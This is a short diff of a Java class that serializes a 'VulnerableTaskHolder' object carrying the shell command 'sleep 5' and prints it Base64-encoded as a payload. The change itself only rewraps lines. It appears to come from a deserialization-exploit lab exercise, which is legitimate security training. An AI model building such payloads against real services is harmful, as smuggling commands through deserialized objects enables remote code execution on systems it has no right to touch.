@@ -10,8 +10,10 @@ public class Serialize {
     public static void main(String[] args) throws IOException{
         var byteStream = new ByteArrayOutputStream();
         var objectStream = new ObjectOutputStream(byteStream);
-        objectStream.writeObject(new VulnerableTaskHolder("myTask", "sleep 5"));
-        String payload = Base64.getEncoder().encodeToString(byteStream.toByteArray());
+        objectStream.writeObject(
+            new VulnerableTaskHolder("myTask", "sleep 5"));
+        String payload = Base64.getEncoder()
+                        .encodeToString(byteStream.toByteArray());
         System.out.println(payload);
     }
 }
